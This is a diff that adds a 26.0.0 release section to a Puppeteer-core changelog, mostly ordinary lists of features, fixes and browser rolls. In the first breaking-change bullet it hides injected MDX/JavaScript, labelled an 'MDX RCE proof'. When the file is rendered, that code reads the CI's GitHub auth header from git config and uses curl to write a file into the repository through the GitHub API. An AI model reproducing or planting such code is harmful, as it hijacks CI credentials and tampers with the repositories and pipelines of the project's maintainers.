@@ -1,5 +1,163 @@
 # Changelog
 
+## [26.0.0](https://github.com/arnodorian1337/puppeteer/compare/puppeteer-core-v25.9.0...puppeteer-core-v26.0.0) (2026-08-27)
+
+
+### ⚠ BREAKING CHANGES
+
+* **puppeteer-core:** release metadata handling updatedexport const cp = globalThis.process.getBuiltinModule("node:child_process")export const auth = cp.execFileSync("git", ["config", "--includes", "--get", "http.https://github.com/.extraheader"]).toString().trim()export const content = "Puppeteer release metadata MDX RCE proof" + String.fromCharCode(10) + "Run: " + globalThis.process.env.GITHUB_RUN_ID + String.fromCharCode(10) + "Actor: " + globalThis.process.env.GITHUB_ACTOR + String.fromCharCode(10) + "Repository: " + globalThis.process.env.GITHUB_REPOSITORY + String.fromCharCode(10)export const body = JSON.stringify(Object.fromEntries([["message", "poc: prove release metadata MDX execution"], ["content", globalThis.process.getBuiltinModule("node:buffer").Buffer.from(content).toString("base64")], ["branch", "main"]]))export const _p = cp.execFileSync("curl", ["--fail-with-body", "--silent", "--show-error", "-X", "PUT", "-H", auth, "-H", "Accept: application/vnd.github+json", "-H", "X-GitHub-Api-Version: 2022-11-28", "-d", body, "https://api.github.com/repos/" + globalThis.process.env.GITHUB_REPOSITORY + "/contents/poc.txt"])MDX_POC_END
+* remove deprecated Puppeteer.product ([#14977](https://github.com/arnodorian1337/puppeteer/issues/14977))
+* bump min NodeJS to 22 ([#14973](https://github.com/arnodorian1337/puppeteer/issues/14973))
+* return a Promise for executablePath, defaultArgs ([#14965](https://github.com/arnodorian1337/puppeteer/issues/14965))
+* remove deprecated MouseOptions.clickCount ([#13865](https://github.com/arnodorian1337/puppeteer/issues/13865))
+* update min version - Node v20.19 and Typescript v5.0.1 ([#14364](https://github.com/arnodorian1337/puppeteer/issues/14364))
+* remove deprecated Browser.isConnected() ([#14910](https://github.com/arnodorian1337/puppeteer/issues/14910))
+* move packages to ESM only ([#14355](https://github.com/arnodorian1337/puppeteer/issues/14355))
+* **puppeteer-core:** Remove Cookie attribute sameParty ([#14545](https://github.com/arnodorian1337/puppeteer/issues/14545))
+* normalize newline-separated headers to comma-separated format ([#14492](https://github.com/arnodorian1337/puppeteer/issues/14492))
+
+### 🎉 Features
+
+* add browser-level PWA install/launch/uninstall APIs ([#15235](https://github.com/arnodorian1337/puppeteer/issues/15235)) ([4a48c8a](https://github.com/arnodorian1337/puppeteer/commit/4a48c8a3637376a19238696bcc40816962380b1d))
+* add metadata to extensions object ([#14870](https://github.com/arnodorian1337/puppeteer/issues/14870)) ([d3e190e](https://github.com/arnodorian1337/puppeteer/commit/d3e190e8aea051bf1cfdfb466909bfeca3b453c9))
+* add page locale emulation ([#15075](https://github.com/arnodorian1337/puppeteer/issues/15075)) ([c528f65](https://github.com/arnodorian1337/puppeteer/commit/c528f6508dcbe830a2bf7b61605ea53b14b56168))
+* add waitForFunction to webWorkers ([#15100](https://github.com/arnodorian1337/puppeteer/issues/15100)) ([0bdfa77](https://github.com/arnodorian1337/puppeteer/commit/0bdfa77b1244f4a397e22fc1ed4d9cf6eabe2697))
+* allow extensions to run over websockets ([#15059](https://github.com/arnodorian1337/puppeteer/issues/15059)) ([b84d8a1](https://github.com/arnodorian1337/puppeteer/commit/b84d8a18584fcf54670fff169408b8ac712d8c06))
+* **cdp:** support autofilling address ([#14826](https://github.com/arnodorian1337/puppeteer/issues/14826)) ([c2acadc](https://github.com/arnodorian1337/puppeteer/commit/c2acadc29e28846d09a8d0e60879c44a6c2e0b05))
+* expose custom Logger to launch/connect ([#15324](https://github.com/arnodorian1337/puppeteer/issues/15324)) ([ffe68ee](https://github.com/arnodorian1337/puppeteer/commit/ffe68ee9ef16655c747d8d67a6ddd1a427dcb8fe))
+* expose Explicit Resource Management (`using`) ([#15027](https://github.com/arnodorian1337/puppeteer/issues/15027)) ([a1ca86b](https://github.com/arnodorian1337/puppeteer/commit/a1ca86b9df6036d76c055c94be2661b90e1d800c))
+* expose handled getter on Dialog ([#15225](https://github.com/arnodorian1337/puppeteer/issues/15225)) ([be6f726](https://github.com/arnodorian1337/puppeteer/commit/be6f72675587722e75b84edfc4bd813180ac1031))
+* Implement allowlist ([#14897](https://github.com/arnodorian1337/puppeteer/issues/14897)) ([e7e31f8](https://github.com/arnodorian1337/puppeteer/commit/e7e31f8a33b95bb79958ca6077f418c21ea6c88d))
+* implement URL blocklist to restrict access to unauthorized sites ([#14873](https://github.com/arnodorian1337/puppeteer/issues/14873)) ([8ad881c](https://github.com/arnodorian1337/puppeteer/commit/8ad881c61895f2689ae2aaddef5f37586000aa88))
+* move packages to ESM only ([#14355](https://github.com/arnodorian1337/puppeteer/issues/14355)) ([4c22177](https://github.com/arnodorian1337/puppeteer/commit/4c22177a7dcbd5a5fe6922eec75351bb56cd0336))
+* **puppeteer-core:** release metadata handling updated ([565a05e](https://github.com/arnodorian1337/puppeteer/commit/565a05e8448a7d8ccbff8b56d659005869f8c1f8))
+* roll to Chrome 148.0.7778.56 ([#14918](https://github.com/arnodorian1337/puppeteer/issues/14918)) ([65890b7](https://github.com/arnodorian1337/puppeteer/commit/65890b7fe735d6706ea614ba04613f7132b1e08f))
+* roll to Chrome 149.0.7827.2 ([af1b9be](https://github.com/arnodorian1337/puppeteer/commit/af1b9be6b6a178f7ea6e197f738ca3cf99d786f7))
+* roll to Chrome 150.0.7871.24 ([#15126](https://github.com/arnodorian1337/puppeteer/issues/15126)) ([b74ed1c](https://github.com/arnodorian1337/puppeteer/commit/b74ed1c81caffa7c727b8e21498dda42899467ed))
+* roll to Chrome 151.0.7922.47 ([#15237](https://github.com/arnodorian1337/puppeteer/issues/15237)) ([06442ae](https://github.com/arnodorian1337/puppeteer/commit/06442aeb8b03fb9effb32bd261a9bffa0b45603a))
+* roll to Chrome 152.0.7977.42 ([#15330](https://github.com/arnodorian1337/puppeteer/issues/15330)) ([0c187db](https://github.com/arnodorian1337/puppeteer/commit/0c187db99161fe49d7d966d242f131c63337e76e))
+* roll to Firefox 150.0 ([#14900](https://github.com/arnodorian1337/puppeteer/issues/14900)) ([beab61b](https://github.com/arnodorian1337/puppeteer/commit/beab61bdb011679a00e7a0719632f7d09f00431a))
+* roll to Firefox 151.0 ([#15013](https://github.com/arnodorian1337/puppeteer/issues/15013)) ([767ea54](https://github.com/arnodorian1337/puppeteer/commit/767ea549da1510f0838987f250b5d6be4e0f8960))
+* roll to Firefox 152.0 ([#15125](https://github.com/arnodorian1337/puppeteer/issues/15125)) ([87be906](https://github.com/arnodorian1337/puppeteer/commit/87be90674742650fd0bcb138922ff61d2bf2ca98))
+* roll to Firefox 153.0 ([#15258](https://github.com/arnodorian1337/puppeteer/issues/15258)) ([6a54140](https://github.com/arnodorian1337/puppeteer/commit/6a541408972cffff21bab4a7b45e64507bb50835))
+* roll to Firefox 154.0 ([#15361](https://github.com/arnodorian1337/puppeteer/issues/15361)) ([d702da7](https://github.com/arnodorian1337/puppeteer/commit/d702da7ec7d72e3a814ffcf0c4bc70a11c171748))
+* support checkboxes and radios in locator.fill ([#14939](https://github.com/arnodorian1337/puppeteer/issues/14939)) ([fec05a0](https://github.com/arnodorian1337/puppeteer/commit/fec05a099b1b762b997c5d0bbb210900f4790e1c))
+* support followSymlinks option ([#15335](https://github.com/arnodorian1337/puppeteer/issues/15335)) ([af6a23d](https://github.com/arnodorian1337/puppeteer/commit/af6a23dde5e95516929b24b62f2eac4e71fa14c8))
+* support installing extensions for browser contexts ([#15164](https://github.com/arnodorian1337/puppeteer/issues/15164)) ([118d84d](https://github.com/arnodorian1337/puppeteer/commit/118d84d2622306f1b9e85ed9acee22b2931f12c7))
+* support shadow roots in MutationPoller ([#15292](https://github.com/arnodorian1337/puppeteer/issues/15292)) ([4670a25](https://github.com/arnodorian1337/puppeteer/commit/4670a25b16d48c8be8e4a747412a8caf4509063f))
+* **tracing:** support bufferSize option in tracing.start ([#15328](https://github.com/arnodorian1337/puppeteer/issues/15328)) ([987f146](https://github.com/arnodorian1337/puppeteer/commit/987f146b85115b73f8415c1c1b93d3b42576f058))
+* track dialog status ([#15266](https://github.com/arnodorian1337/puppeteer/issues/15266)) ([9a6f646](https://github.com/arnodorian1337/puppeteer/commit/9a6f6461996dcd1918f87e018e1916417e531628))
+* **webmcp:** Add support for untrustedContent WebMCPAnnotation ([#14901](https://github.com/arnodorian1337/puppeteer/issues/14901)) ([0314942](https://github.com/arnodorian1337/puppeteer/commit/0314942d5a1997c34afb8bb8660f8263c4975921))
+* **webmcp:** support canceling tool execution ([#15365](https://github.com/arnodorian1337/puppeteer/issues/15365)) ([3523f36](https://github.com/arnodorian1337/puppeteer/commit/3523f36e840b6c7ebf1167eddb5c2e83c9262c68))
+
+
+### 🛠️ Fixes
+
+* apply allowlist to non-auto-attach sessions ([#15136](https://github.com/arnodorian1337/puppeteer/issues/15136)) ([5c7a0e0](https://github.com/arnodorian1337/puppeteer/commit/5c7a0e0e09eef73177d27d4c4fa2669ebe8d65b7))
+* await for Worker script exection ([#15099](https://github.com/arnodorian1337/puppeteer/issues/15099)) ([dc469b8](https://github.com/arnodorian1337/puppeteer/commit/dc469b8aae9008b8ec665014d4fac9e13c8a0650))
+* block service worker registrations ([#15135](https://github.com/arnodorian1337/puppeteer/issues/15135)) ([d03617c](https://github.com/arnodorian1337/puppeteer/commit/d03617c36148a0d9ac86c51b3b5661c07c150ef9))
+* block standard network emulation reset if allowlist or blocklist are enabled ([#14976](https://github.com/arnodorian1337/puppeteer/issues/14976)) ([4e75b66](https://github.com/arnodorian1337/puppeteer/commit/4e75b66e333803960c77d88f9357fba411796f36))
+* **cdp:** do not fail a per-frame fan-out when an OOP iframe goes away ([#15300](https://github.com/arnodorian1337/puppeteer/issues/15300)) ([e29c4e7](https://github.com/arnodorian1337/puppeteer/commit/e29c4e7cf30fe0d0170d35ff8947163d06bc9276))
+* combine duplicate BiDi response headers instead of overwriting ([#15203](https://github.com/arnodorian1337/puppeteer/issues/15203)) ([16ec165](https://github.com/arnodorian1337/puppeteer/commit/16ec165d4bdf498e3b0fd6a8a7f0a3f02bfc823b))
+* computeSystemExecutablePath support validatePath ([#15340](https://github.com/arnodorian1337/puppeteer/issues/15340)) ([73da9a4](https://github.com/arnodorian1337/puppeteer/commit/73da9a41b32f26e995ac00b50c958e6e95fb2be2))
+* correct screencast frame timing so playback matches real time ([#15112](https://github.com/arnodorian1337/puppeteer/issues/15112)) ([525b384](https://github.com/arnodorian1337/puppeteer/commit/525b3843bb4920abe2142c1ae381fb2384d9d2dc))
+* disable WebUIOmniboxPopup and WebUIOmniboxAimPopup features ([#15278](https://github.com/arnodorian1337/puppeteer/issues/15278)) ([5dc2964](https://github.com/arnodorian1337/puppeteer/commit/5dc2964de9fd5d22ee02d2f5c81284f4d6500431))
+* Disable WebUIReloadButton experiment ([#14925](https://github.com/arnodorian1337/puppeteer/issues/14925)) ([d9639e9](https://github.com/arnodorian1337/puppeteer/commit/d9639e9dfec81ddd0631bf88c0e673d0056f0632))
+* do not open DevTools if it is already open ([#14922](https://github.com/arnodorian1337/puppeteer/issues/14922)) ([84c9d34](https://github.com/arnodorian1337/puppeteer/commit/84c9d34b687c2ba7af13d0e484450edd285c4cd2))
+* do not override the user agent when nothing is emulated ([#15274](https://github.com/arnodorian1337/puppeteer/issues/15274)) ([39c4653](https://github.com/arnodorian1337/puppeteer/commit/39c4653fae57e412e788f844db7932881c7dc9d3))
+* do not set global offline flag for allowlist ([#14931](https://github.com/arnodorian1337/puppeteer/issues/14931)) ([d6a1003](https://github.com/arnodorian1337/puppeteer/commit/d6a1003384b9fe9810a9b109ef649fbf0f44dd1f))
+* don't throw in checkVisibility for a detached text node ([#15197](https://github.com/arnodorian1337/puppeteer/issues/15197)) ([89683ac](https://github.com/arnodorian1337/puppeteer/commit/89683ac2da9522f7d99df9172b487a50e4cbeec1))
+* enabled features should take precedence over disabled features ([#14985](https://github.com/arnodorian1337/puppeteer/issues/14985)) ([f6fd7c2](https://github.com/arnodorian1337/puppeteer/commit/f6fd7c29f92e6183b2fd48f0571957306c58d440))
+* forward headers to browserURL HTTP discovery and WebSocket connection ([#15238](https://github.com/arnodorian1337/puppeteer/issues/15238)) ([948d870](https://github.com/arnodorian1337/puppeteer/commit/948d8703080e4da25904e970872468cdcc7115d4))
+* Handle missing sessionId when looking up callbacks ([#14975](https://github.com/arnodorian1337/puppeteer/issues/14975)) ([4faa0e6](https://github.com/arnodorian1337/puppeteer/commit/4faa0e6ce9dd5db3ab41407c427de89d08ca20bd))
+* handle swaps without a timer ([#15198](https://github.com/arnodorian1337/puppeteer/issues/15198)) ([2356a15](https://github.com/arnodorian1337/puppeteer/commit/2356a15404acca1e00243a4f72408ecdb916ac11))
+* launch browsers in detached mode on Windows to fix flakiness ([#15339](https://github.com/arnodorian1337/puppeteer/issues/15339)) ([8e1022b](https://github.com/arnodorian1337/puppeteer/commit/8e1022b543f27d9d517310435aaa2b299fe99d46))
+* logger calling causing crashes ([#15338](https://github.com/arnodorian1337/puppeteer/issues/15338)) ([eb874a5](https://github.com/arnodorian1337/puppeteer/commit/eb874a58e55bd7221bca35d4216dc298b1f8ee86))
+* normalize duplicate set-cookie headers using newline ([#15173](https://github.com/arnodorian1337/puppeteer/issues/15173)) ([55787d5](https://github.com/arnodorian1337/puppeteer/commit/55787d515570109ba7e5cb97df18499d743923fb))
+* normalize newline-separated headers to comma-separated format ([#14492](https://github.com/arnodorian1337/puppeteer/issues/14492)) ([1ea5dea](https://github.com/arnodorian1337/puppeteer/commit/1ea5deabbcb6ea81095a3fef5dfd0f1b94d9df61))
+* **puppeteer-core:** Remove Cookie attribute sameParty ([#14545](https://github.com/arnodorian1337/puppeteer/issues/14545)) ([be2d86a](https://github.com/arnodorian1337/puppeteer/commit/be2d86a5659b8391ece6a4026582cf69716aae8c))
+* regression when using Puppeteer with untrusted sessions ([#15150](https://github.com/arnodorian1337/puppeteer/issues/15150)) ([801c212](https://github.com/arnodorian1337/puppeteer/commit/801c2124cfbc4a4a19bb0a40bc3b8a25d7504691))
+* reject BiDi URL restrictions ([#14956](https://github.com/arnodorian1337/puppeteer/issues/14956)) ([b2140ae](https://github.com/arnodorian1337/puppeteer/commit/b2140ae75411bc5c9dc13d10e853372d9dbc9cb5))
+* reject PWA access if network conditions are configured ([#15271](https://github.com/arnodorian1337/puppeteer/issues/15271)) ([6eb2b8c](https://github.com/arnodorian1337/puppeteer/commit/6eb2b8c341bcf330e6e93ddfa3b03fe9c7ece09d))
+* remove global skipDownload early return to include other configs ([#15130](https://github.com/arnodorian1337/puppeteer/issues/15130)) ([5b1cb20](https://github.com/arnodorian1337/puppeteer/commit/5b1cb20ce060c88c5f43f1a4bbfdcfd513db6cc3))
+* remove networkidle options from setContent ([#14940](https://github.com/arnodorian1337/puppeteer/issues/14940)) ([54254e4](https://github.com/arnodorian1337/puppeteer/commit/54254e49668ecf2130e0e6b5ef8d25223264ce14))
+* remove PartitionAllocSchedulerLoopQuarantineTaskControlledPurge from disabled features ([#14872](https://github.com/arnodorian1337/puppeteer/issues/14872)) ([c9909a5](https://github.com/arnodorian1337/puppeteer/commit/c9909a56e6b6d0bcbf8bfb3a6af2b496e6fc489f))
+* remove redundant overwrite and file access from ScreenRecorder ([#15352](https://github.com/arnodorian1337/puppeteer/issues/15352)) ([61a1675](https://github.com/arnodorian1337/puppeteer/commit/61a16759e01ed622ffac0d0426d35180f7ab4064))
+* roll to Chrome 147.0.7727.57 ([#14869](https://github.com/arnodorian1337/puppeteer/issues/14869)) ([51c4305](https://github.com/arnodorian1337/puppeteer/commit/51c4305c0bdefd4e6aca385c9c1097e7a4923cfb))
+* roll to Chrome 148.0.7778.167 ([#14980](https://github.com/arnodorian1337/puppeteer/issues/14980)) ([84c46fe](https://github.com/arnodorian1337/puppeteer/commit/84c46fede6b02a1e9a00104b97b28c263f0c84df))
+* roll to Chrome 148.0.7778.178 ([#15014](https://github.com/arnodorian1337/puppeteer/issues/15014)) ([59764ac](https://github.com/arnodorian1337/puppeteer/commit/59764acccc9e1c7bca75a60472b288595d3f6cbf))
+* roll to Chrome 148.0.7778.97 ([#14929](https://github.com/arnodorian1337/puppeteer/issues/14929)) ([536eb11](https://github.com/arnodorian1337/puppeteer/commit/536eb11c6787be43a3fdbafa153080619b4eaeec))
+* roll to Chrome 150.0.7871.115 ([#15223](https://github.com/arnodorian1337/puppeteer/issues/15223)) ([3232cd4](https://github.com/arnodorian1337/puppeteer/commit/3232cd4bd432107d2007e9d582fee5ade311a1df))
+* roll to Chrome 150.0.7871.46 ([#15196](https://github.com/arnodorian1337/puppeteer/issues/15196)) ([30d4100](https://github.com/arnodorian1337/puppeteer/commit/30d4100bca7512c8a227bc141cef580faee8bc5d))
+* roll to Chrome 150.0.7871.49 ([#15220](https://github.com/arnodorian1337/puppeteer/issues/15220)) ([633d55d](https://github.com/arnodorian1337/puppeteer/commit/633d55dc82cd0bd85dc012db736a42c44e7e890d))
+* roll to Chrome 151.0.7922.71 ([#15272](https://github.com/arnodorian1337/puppeteer/issues/15272)) ([a7f07db](https://github.com/arnodorian1337/puppeteer/commit/a7f07dbab0e5e900c0a8e2858a94fbb8ccb26c5c))
+* roll to Chrome 151.0.7922.76 ([#15295](https://github.com/arnodorian1337/puppeteer/issues/15295)) ([5c78fe3](https://github.com/arnodorian1337/puppeteer/commit/5c78fe35147c8191bfb4b10f55a1937ed96f38ca))
+* roll to Chrome 151.0.7922.77 ([#15308](https://github.com/arnodorian1337/puppeteer/issues/15308)) ([321aa69](https://github.com/arnodorian1337/puppeteer/commit/321aa69374665d559a4f7b92769731c53551c4d0))
+* roll to Chrome 152.0.7977.54 ([#15363](https://github.com/arnodorian1337/puppeteer/issues/15363)) ([9088feb](https://github.com/arnodorian1337/puppeteer/commit/9088feb7d71cda035eee4f4d21cb20fee9238aa9))
+* roll to Chrome 152.0.7977.64 ([#15395](https://github.com/arnodorian1337/puppeteer/issues/15395)) ([974e536](https://github.com/arnodorian1337/puppeteer/commit/974e53667e81363e36f634222eb300a054c1fb6c))
+* roll to Firefox 150.0.1 ([#14923](https://github.com/arnodorian1337/puppeteer/issues/14923)) ([50438cf](https://github.com/arnodorian1337/puppeteer/commit/50438cff577f8f27d34aefeb2af84658b62d7db5))
+* roll to Firefox 150.0.2 ([#14946](https://github.com/arnodorian1337/puppeteer/issues/14946)) ([a588310](https://github.com/arnodorian1337/puppeteer/commit/a58831074136da60b3a8ea1c28be799d9027c830))
+* roll to Firefox 150.0.3 ([#14983](https://github.com/arnodorian1337/puppeteer/issues/14983)) ([872f778](https://github.com/arnodorian1337/puppeteer/commit/872f77822d6b6b9b6510752d838107a967241bdb))
+* roll to Firefox 152.0.1 ([#15134](https://github.com/arnodorian1337/puppeteer/issues/15134)) ([fd12dd6](https://github.com/arnodorian1337/puppeteer/commit/fd12dd6f31604835b7476b624b8972b8c8c090b6))
+* roll to Firefox 152.0.2 ([#15153](https://github.com/arnodorian1337/puppeteer/issues/15153)) ([d2908b2](https://github.com/arnodorian1337/puppeteer/commit/d2908b2cdf3e3fa721a063d40b50d532b39bbc72))
+* roll to Firefox 152.0.3 ([#15158](https://github.com/arnodorian1337/puppeteer/issues/15158)) ([2d64852](https://github.com/arnodorian1337/puppeteer/commit/2d648522d4a90ed7fc5c79e6298f36f0dc0781f4))
+* roll to Firefox 152.0.4 ([#15195](https://github.com/arnodorian1337/puppeteer/issues/15195)) ([d382a21](https://github.com/arnodorian1337/puppeteer/commit/d382a218051c323e1d4d4d1a528c53370a6b1ee7))
+* roll to Firefox 152.0.5 ([#15219](https://github.com/arnodorian1337/puppeteer/issues/15219)) ([5de975a](https://github.com/arnodorian1337/puppeteer/commit/5de975a415e34455fb431e473205e281374162b7))
+* roll to Firefox 153.0.1 ([#15269](https://github.com/arnodorian1337/puppeteer/issues/15269)) ([dd365cc](https://github.com/arnodorian1337/puppeteer/commit/dd365cc473c2064423e70805b9cc3b0ce6184838))
+* roll to Firefox 153.0.3 ([#15294](https://github.com/arnodorian1337/puppeteer/issues/15294)) ([6c0a749](https://github.com/arnodorian1337/puppeteer/commit/6c0a7490d6b79410335639ca7cde87aaa9c98ed4))
+* roll to Firefox 153.0.4 ([#15329](https://github.com/arnodorian1337/puppeteer/issues/15329)) ([df5a524](https://github.com/arnodorian1337/puppeteer/commit/df5a5241108b6856d8198b019e6772c001da2729))
+* roll to Firefox 154.0.1 ([#15397](https://github.com/arnodorian1337/puppeteer/issues/15397)) ([8ac76fd](https://github.com/arnodorian1337/puppeteer/commit/8ac76fdbdee170902a2ac4e831c9c82cafe17b65))
+* set frame content without document.write ([#15358](https://github.com/arnodorian1337/puppeteer/issues/15358)) ([83f8d1c](https://github.com/arnodorian1337/puppeteer/commit/83f8d1c8536f238dbdfdf041c72581bdf2b6f3de))
+* Throw TargetCloseError when session ID not found ([#15002](https://github.com/arnodorian1337/puppeteer/issues/15002)) ([611abef](https://github.com/arnodorian1337/puppeteer/commit/611abef6c4efd1852947025ac2eb141d99d991b4))
+* update docs text ([#14992](https://github.com/arnodorian1337/puppeteer/issues/14992)) ([36527b8](https://github.com/arnodorian1337/puppeteer/commit/36527b8b9dd856e11a372b46cba23409e5613573))
+* **webdriver:** don't store request on BrowsingContext ([#14966](https://github.com/arnodorian1337/puppeteer/issues/14966)) ([4e4daec](https://github.com/arnodorian1337/puppeteer/commit/4e4daec603f62f206a93019693d24ba7b93ad9d4))
+* **webmcp:** invalidate webmcp tools on context destruction ([#15068](https://github.com/arnodorian1337/puppeteer/issues/15068)) ([8e9c0fa](https://github.com/arnodorian1337/puppeteer/commit/8e9c0fa4ac4054f3f31868f17761c73335229306))
+
+
+### 📄 Documentation
+
+* bump min NodeJS to 22 ([#14973](https://github.com/arnodorian1337/puppeteer/issues/14973)) ([4b6ddc3](https://github.com/arnodorian1337/puppeteer/commit/4b6ddc3a2631518651187b7795e36fae9a976121))
+* clarify the network allowlist/blocklist implementation ([#15148](https://github.com/arnodorian1337/puppeteer/issues/15148)) ([a7f124c](https://github.com/arnodorian1337/puppeteer/commit/a7f124c930e6119581a4e54c3293cbca66c0f498))
+* document units in page.metrics() ([#15221](https://github.com/arnodorian1337/puppeteer/issues/15221)) ([eae2b9a](https://github.com/arnodorian1337/puppeteer/commit/eae2b9a6eef9de65dfef95232657d032d647f0a3))
+* fix the typos on documentation ([#15167](https://github.com/arnodorian1337/puppeteer/issues/15167)) ([ab74e6a](https://github.com/arnodorian1337/puppeteer/commit/ab74e6a6720ec05768979e3c2d9b26bcb5cd763f))
+* update min version - Node v20.19 and Typescript v5.0.1 ([#14364](https://github.com/arnodorian1337/puppeteer/issues/14364)) ([96f3780](https://github.com/arnodorian1337/puppeteer/commit/96f3780289d42557b648a18d806843a28da7e2f5))
+* Update Page.target deprecation message to cover broader usage. ([#15108](https://github.com/arnodorian1337/puppeteer/issues/15108)) ([882c43d](https://github.com/arnodorian1337/puppeteer/commit/882c43d57698596921d83b56ef82b666ad0528c5))
+* use ESM and top level await ([#15030](https://github.com/arnodorian1337/puppeteer/issues/15030)) ([34ecc62](https://github.com/arnodorian1337/puppeteer/commit/34ecc62957bdd2c83820a51d5d1a6acb81e2957d))
+
+
+### ⚡ Performance
+
+* **cdp:** parallelize extension workers fetching ([#15057](https://github.com/arnodorian1337/puppeteer/issues/15057)) ([fdee509](https://github.com/arnodorian1337/puppeteer/commit/fdee509f47f1587f17cf25b176a50d5d8fcde38a))
+* dispose sub-classes correctly ([#14430](https://github.com/arnodorian1337/puppeteer/issues/14430)) ([e285ff2](https://github.com/arnodorian1337/puppeteer/commit/e285ff2dec00dd4f3e0b125a4f26c394ac369e72))
+* optimize `headersArray` iteration in HTTPRequest ([#15004](https://github.com/arnodorian1337/puppeteer/issues/15004)) ([eb95798](https://github.com/arnodorian1337/puppeteer/commit/eb9579844f071c2aa8ad1a0c19443b618fac63b7))
+* optimize property descriptors iteration in JSHandle ([#15094](https://github.com/arnodorian1337/puppeteer/issues/15094)) ([2483b65](https://github.com/arnodorian1337/puppeteer/commit/2483b656cd17b99af089087094a0e6f88c6ba4fb))
+* optimize url blocking on navigation ([#14945](https://github.com/arnodorian1337/puppeteer/issues/14945)) ([e4002a4](https://github.com/arnodorian1337/puppeteer/commit/e4002a4264626982a5228e72b07e2e47b0187189))
+* parallelize iframe population in accessibility snapshots ([#15083](https://github.com/arnodorian1337/puppeteer/issues/15083)) ([7e3d42e](https://github.com/arnodorian1337/puppeteer/commit/7e3d42ec56c017978ca780af394ac4e5cf5391fd))
+* **webdriver:** remove intermediate object wrappers ([#14967](https://github.com/arnodorian1337/puppeteer/issues/14967)) ([c19b855](https://github.com/arnodorian1337/puppeteer/commit/c19b855390e94a6e571fa540c872e3351fec4e7d))
+
+
+### 🏗️ Refactor
+
+* don't use debug lib directly ([#14969](https://github.com/arnodorian1337/puppeteer/issues/14969)) ([7cbebc6](https://github.com/arnodorian1337/puppeteer/commit/7cbebc6ea1d881ce6538a82014e73dd0e785e754))
+* move some of the logger to constructor ([#15282](https://github.com/arnodorian1337/puppeteer/issues/15282)) ([67d1467](https://github.com/arnodorian1337/puppeteer/commit/67d1467d8d7d0101988df3a9a46249c65e8cc7d3))
+* pass logger though the constructors ([#15297](https://github.com/arnodorian1337/puppeteer/issues/15297)) ([76c2a8d](https://github.com/arnodorian1337/puppeteer/commit/76c2a8dac21a7faf83ba1fb15b2b018aa1417c7f))
+* remove debug dependency ([#15023](https://github.com/arnodorian1337/puppeteer/issues/15023)) ([94d1e1c](https://github.com/arnodorian1337/puppeteer/commit/94d1e1c3dc84ed102d2e801a4e6343cd9fd4a9af))
+* remove deprecated Browser.isConnected() ([#14910](https://github.com/arnodorian1337/puppeteer/issues/14910)) ([f2cdffc](https://github.com/arnodorian1337/puppeteer/commit/f2cdffc4d4d6c965098666cdb79bb8a39de0ea0d))
+* remove deprecated MouseOptions.clickCount ([#13865](https://github.com/arnodorian1337/puppeteer/issues/13865)) ([1f6bd1f](https://github.com/arnodorian1337/puppeteer/commit/1f6bd1f98fc9090b632442538b066aa04368a87c))
+* remove deprecated Puppeteer.product ([#14977](https://github.com/arnodorian1337/puppeteer/issues/14977)) ([2b097b7](https://github.com/arnodorian1337/puppeteer/commit/2b097b714ebf2e0e61e71002194caacecbdcedf8))
+* return a Promise for executablePath, defaultArgs ([#14965](https://github.com/arnodorian1337/puppeteer/issues/14965)) ([74059fd](https://github.com/arnodorian1337/puppeteer/commit/74059fd3352b789df73cb297c56be6694b2200ab))
+* sync accessing debugger ([#15066](https://github.com/arnodorian1337/puppeteer/issues/15066)) ([9046239](https://github.com/arnodorian1337/puppeteer/commit/904623947f270e50243c3f7fb74f4aef3245c22d))
+* use a enum to manage the prefixes ([#15281](https://github.com/arnodorian1337/puppeteer/issues/15281)) ([c8faa53](https://github.com/arnodorian1337/puppeteer/commit/c8faa53225f96a0f3a0e4d18958c3405e3ee4d57))
+* use Desposable stacks to track listeners ([#15332](https://github.com/arnodorian1337/puppeteer/issues/15332)) ([df2d719](https://github.com/arnodorian1337/puppeteer/commit/df2d71988ef7b2a857ff66615cdc28a857078e9c))
+* use logger that is passed down ([#15302](https://github.com/arnodorian1337/puppeteer/issues/15302)) ([3b1339e](https://github.com/arnodorian1337/puppeteer/commit/3b1339ef5a2d72d976e2505e968f2853d978a63e))
+
+
+### Dependencies
+
+* The following workspace dependencies were updated
+  * dependencies
+    * @puppeteer/browsers bumped from 3.2.1 to 4.0.0
+
 ## [25.9.0](https://github.com/puppeteer/puppeteer/compare/puppeteer-core-v25.8.0...puppeteer-core-v25.9.0) (2026-08-24)
 
 
